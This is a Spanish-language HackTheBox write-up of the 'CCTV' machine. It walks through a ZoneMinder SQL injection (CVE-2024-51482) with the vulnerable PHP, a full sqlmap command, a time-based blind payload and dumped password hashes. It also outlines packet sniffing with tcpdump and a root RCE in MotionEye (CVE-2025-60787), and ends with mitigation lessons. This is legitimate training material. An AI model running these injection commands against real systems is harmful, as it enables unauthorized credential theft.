Descripción de la Máquina

CCTV es una máquina Linux de dificultad Media en HackTheBox. Simula un sistema de videovigilancia corporativo construido sobre dos plataformas open-source: ZoneMinder (interfaz pública) y MotionEye (servicio interno en Docker). La cadena de explotación combina vulnerabilidades conocidas con técnicas clásicas de post-explotación en entornos con Docker.

El vector inicial es una SQL Injection autenticada en ZoneMinder v1.37.63 (CVE-2024-51482). Las credenciales obtenidas permiten acceso SSH. Desde allí, el abuso de cap_net_raw en tcpdump revela la contraseña de un servicio interno en texto plano. La escalada final se produce explotando CVE-2025-60787 en MotionEye 0.43.1b4 mediante Metasploit.

💡
Concepto clave — Docker + tráfico interno: Los servicios dockerizados frecuentemente se comunican sin TLS en redes internas. Con cap_net_raw un usuario no-root puede capturar todo ese tráfico, exponiendo credenciales y tokens transmitidos en texto plano.
📷
ZoneMinder v1.37.63
Plataforma de CCTV expuesta públicamente. Login con credenciales por defecto. SQLi en parámetro tid (CVE-2024-51482).
📺
MotionEye 0.43.1b4
App de gestión CCTV corriendo en Docker, accesible solo via localhost:8765. RCE como root via CVE-2025-60787.

3.2 — CVE-2024-51482: SQL Injection en tid

🚫 CVE-2024-51482 — ZoneMinder SQL Injection

El archivo web/ajax/event.php en la línea 217 asigna el parámetro tid del request directamente a $tagId sin sanitización. Mientras la primera query usa placeholders preparados, la segunda concatena el valor directamente en SQL:

PHP — web/ajax/event.php:217 (vulnerable)
case 'removetag': $tagId = $_REQUEST['tid']; // Sin sanitización // Primera query — SEGURA (parametrizada) dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?', array($tagId, $_REQUEST['id'])); // Segunda query — VULNERABLE (concatenación directa) $sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"; $rowCount = dbNumRows($sql); ← SQLi aquí
sqlmap — extracción de credenciales
$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1" \ --cookie "zmSkin=classic; zmCSS=base; ZMSESSID=n6rhknudonjn3qcea2hfaebuia" \ -p "tid" \ --batch \ --technique=T \ --time-sec=3 \ --predict-output \ -D zm -T Users -C Username,Password \ --dump [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable [INFO] adjusting time delay to 1 second due to good response times --- Tipo de Inyección --- Type: time-based blind Payload: tid=1 AND (SELECT 3086 FROM (SELECT(SLEEP(3)))dHht) --- Resultados extraídos (zm.Users) --- Username: superadmin Password: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm Username: mark Password: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.

CVE-2025-60787 — RCE como Root

Análisis de la Vulnerabilidad

🚫 CVE-2025-60787 — MotionEye Config Injection RCE

MotionEye permite a administradores configurar nombres de archivos de imagen/video desde la UI web. Estos valores se escriben directamente en los archivos de configuración de motion sin sanitización de metacaracteres shell. El proceso motion ejecuta esos valores como parte de comandos shell, permitiendo inyección de comandos arbitrarios con los privilegios de root.

Flujo — del input al RCE
usuario → campo image_file_name ↓ (sin sanitización) archivo config motion ↓ (ejecutado por motion como root) RCE con UID=0

Lecciones Aprendidas & Mitigaciones

🔑 Cambiar credenciales por defecto
admin:admin en ZoneMinder es el punto de entrada. Las plataformas de vigilancia nunca deben desplegarse con credenciales de fábrica. Forzar cambio en el primer inicio de sesión.
📊 Parchear inmediatamente (CVEs)
ZoneMinder v1.37.63 tiene CVE-2024-51482 conocida y pública. El patch simplemente cambia la query a prepared statement. No actualizar es deuda de seguridad directa.
🔐 Limitar Linux Capabilities
cap_net_raw en tcpdump permite sniffing sin root. Solo otorgar capabilities estrictamente necesarias y a usuarios/procesos específicos, no globalmente.
🔒 Cifrar tráfico interno
El servicio Flask transmite credenciales en texto plano. Todo tráfico entre microservicios/contenedores debe usar TLS, incluso en redes internas.
🔓 No reutilizar contraseñas
La contraseña de sa_mark sirvió tanto para SSH como para MotionEye admin. Cada servicio debe tener credenciales únicas e independientes.
📋 Segmentar servicios internos
MotionEye no debería ejecutarse como root en el contenedor. Aplicar principio de mínimo privilegio: cada servicio con su propio usuario sin privilegios.
